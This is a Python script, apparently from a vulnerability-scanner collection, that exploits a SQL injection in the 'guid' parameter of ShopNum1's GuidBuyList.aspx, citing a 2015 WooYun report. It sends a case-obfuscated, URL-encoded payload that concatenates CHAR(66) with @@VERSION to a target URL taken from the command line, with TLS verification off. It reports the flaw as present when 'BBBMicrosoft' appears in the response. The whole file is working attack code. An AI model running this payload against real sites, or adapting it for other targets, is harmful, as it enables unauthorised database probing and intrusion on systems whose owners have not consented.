#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: shopnum1 GuidBuyList.aspx SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0118447
author: Lucifer
description: 文件GuidBuyList.aspx中,参数guid存在SQL注入。
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class shopnum_GuidBuyList_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/GuidBuyList.aspx?guid=97dcbadc-9b4f-4ff5-9ffb-17e46e10d66d%27AnD(ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsiOn)%3E0--"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                printGreen("[+]Success:存在shopnum1 GuidBuyList.aspx SQL注入漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在shopnum_GuidBuyList_sqli漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = shopnum_GuidBuyList_sqli(sys.argv[1])
    testVuln.run()